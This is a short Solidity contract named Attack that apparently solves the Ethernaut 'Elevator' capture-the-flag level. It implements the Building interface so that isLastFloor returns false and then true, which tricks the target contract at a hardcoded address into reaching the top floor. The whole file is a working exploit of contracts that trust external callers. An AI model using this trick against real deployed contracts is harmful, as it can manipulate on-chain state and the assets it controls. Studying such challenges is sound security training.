// SPDX-License-Identifier: MIT

pragma solidity >=0.7.0 <0.9.0;

interface Elevator {
     function goTo(uint _floor)external;
}

interface Building {
  function isLastFloor(uint _floor) external returns (bool);
}


contract Attack is Building{

Elevator _elevator = Elevator(0x8Ab35e498960331A5C104e28A0Fd90Bb7C1d20C8);
  
uint public counter = 1;
function initiateGoTo(uint _floor) public {
    _elevator.goTo(_floor);
}
function isLastFloor(uint _floor) external override returns(bool){
    bool ans = false;
    if(counter % 2 == 0)
    {
     ans = true;
    } 
    counter += 1;
    return ans;
    
}
}
